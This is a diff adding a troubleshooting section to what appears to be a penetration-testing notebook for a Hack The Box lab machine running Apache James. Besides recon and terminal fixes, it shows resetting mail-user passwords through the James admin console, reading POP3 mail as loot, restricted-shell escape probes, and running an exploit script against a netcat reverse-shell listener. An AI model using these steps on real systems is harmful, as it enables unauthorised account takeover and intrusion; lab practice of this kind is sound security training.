@@ -893,7 +893,140 @@ proxychains -q $Command
 <!-- TODO --> <!-- Add Ligolo-ng and Windows native port-forwarding commands. -->
 <!-- TODO --> <!-- Add Ligolo-ng, Plink, Rpivot, Dnscat2, Meterpreter portfwd, ptunnel-ng, and SocksOverRDP commands. -->
 
-## 15. CLEANUP
+## 15. TROUBLESHOOTING & RECOVERY
+
+Use this section when a box has been reverted, an address has changed, an old service scan hangs, a restricted shell rejects a payload, or a callback appears to fail. Fix one layer at a time: target address, route, service, command delivery, listener, then privilege.
+
+### Changed target IP after a reset
+
+```bash
+# Set both values privately before testing the current target.
+boxset OldBoxIP OLD_TARGET_IP
+boxset BoxIP CURRENT_TARGET_IP
+export BoxIP=CURRENT_TARGET_IP
+echo "$BoxIP"
+ip addr show tun0
+ip route get "$BoxIP"
+ping -c 1 "$BoxIP"
+nc -vz -w 3 "$BoxIP" 22
+
+# Remove only the stale SSH host-key entry for the old target.
+ssh-keygen -R "$OldBoxIP"
+grep -nE 'solidstate|OLD_TARGET_IP|CURRENT_TARGET_IP' /etc/hosts
+```
+
+> [!warning] 💡
+> `boxset` saves the value for the box helper, while `export` changes only the current shell. Print `$BoxIP` immediately before SSH, Nmap, or an exploit if a command appears to use the wrong host.
+
+### Slow or unreliable legacy service scans
+
+```bash
+# Preserve the interesting port list, then avoid repeating a hanging --version-all scan.
+boxset OpenPorts "22,25,80,110,119,4555"
+sudo nmap -Pn -n -sC -sV --version-light \
+  -p"$OpenPorts" -oA "$BoxDir/nmap/services" "$BoxIP"
+
+# Probe mail and custom ports separately with a short timeout.
+for Port in 25 110 119 4555; do
+  printf '\n=== TCP/%s ===\n' "$Port"
+  timeout 5 nc -nv "$BoxIP" "$Port" < /dev/null
+done
+```
+
+> [!tip] ⚡ Efficiency
+> A version scan is a routing tool. If one legacy protocol consumes minutes, save the useful output, switch to `--version-light`, and use targeted banner probes instead of waiting for every NSE script to finish.
+
+### Apache James and line-oriented POP3 checks
+
+```bash
+boxset JamesPort 4555
+boxset POP3Port 110
+nc -nv "$BoxIP" "$JamesPort"
+# Enter the private administrator values at the prompts, then use:
+# listusers
+# setpassword $Username $Password
+# quit
+
+# POP3 is line-oriented and expects CRLF-terminated commands.
+telnet "$BoxIP" "$POP3Port"
+# USER $Username
+# PASS $Password
+# LIST
+# RETR 2
+# QUIT
+
+# Non-interactive alternative, with the credential kept in private variables.
+printf 'USER %s\r\nPASS %s\r\nLIST\r\nRETR 2\r\nQUIT\r\n' \
+  "$Username" "$Password" \
+  | timeout 10 nc -nv "$BoxIP" "$POP3Port" \
+  > "$BoxDir/loot/pop3-session.txt"
+```
+
+> [!warning] 💡
+> A generic Nmap label such as `rsip` does not identify the application. Read the banner on the port itself. If raw `nc` appears idle on POP3, use `telnet` or send explicit `\r\n` line endings.
+
+### Restricted Bash or `rbash` diagnosis
+
+```bash
+# Run inside the SSH or callback shell.
+echo "$SHELL"
+echo "$PATH"
+command -v bash sh python python3 env cat ls scp 2>/dev/null
+ls -la "$HOME/bin"
+cat /etc/passwd
+
+# These probes distinguish restricted command names and redirections.
+env /bin/bash -i
+/usr/bin/python -c 'import os; os.system("/bin/bash")'
+```
+
+If `/dev/tcp` or absolute command names are rejected, do not keep changing the same payload. Use an application-side write primitive, an allowed transfer mechanism, or a callback generated for a confirmed target interpreter:
+
+```bash
+boxset Lport 9001
+ss -ltnp | grep ":$Lport" || true
+nc -lvnp "$Lport"
+python3 "$BoxDir/exploits/james-50347.py" \
+  "$BoxIP" "$LocalIP" "$Lport"
+ssh "$Username@$BoxIP"
+```
+
+> [!tip] 🛠️ Better tool
+> Use [RevShells](https://www.revshells.com/) to choose Bash, Python, PHP, or Netcat for the interpreter confirmed on the target. Use [HackTricks](https://book.hacktricks.wiki/en/index.html) for restricted-shell behaviour and [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) for delivery alternatives.
+
+### Callback and suspended-listener checks
+
+```bash
+# Listener must be started before the exploit or login trigger.
+ss -ltnp | grep -E ":$Lport|:$RootPort" || true
+nc -lvnp "$Lport"
+
+# After Ctrl+Z on a raw callback listener, recover the local terminal.
+stty raw -echo; fg
+export TERM=xterm
+stty rows 40 columns 120
+
+# If the local display is broken, type reset and press Enter.
+reset
+```
+
+> [!warning] 💡
+> A callback can fail because the target did not execute the command, the target has the wrong `$LocalIP`, the listener port is occupied, or the local terminal is suspended. Check those in that order.
+
+### Preserve a missing or unrecorded step
+
+```bash
+# Start a fresh transcript before repeating a step that was lost during a reconnect.
+htblog
+printf 'Target: %s\nLocal: %s\nPort: %s\n' "$BoxIP" "$LocalIP" "$Lport"
+id
+whoami
+hostname
+```
+
+Record the exact trigger, callback port, identity output, and cleanup path. A screenshot or loot file can prove a result, but it does not reconstruct a command that was never captured.
+
+## 16. CLEANUP
 
 ```bash
 # Remove local payloads and temporary files
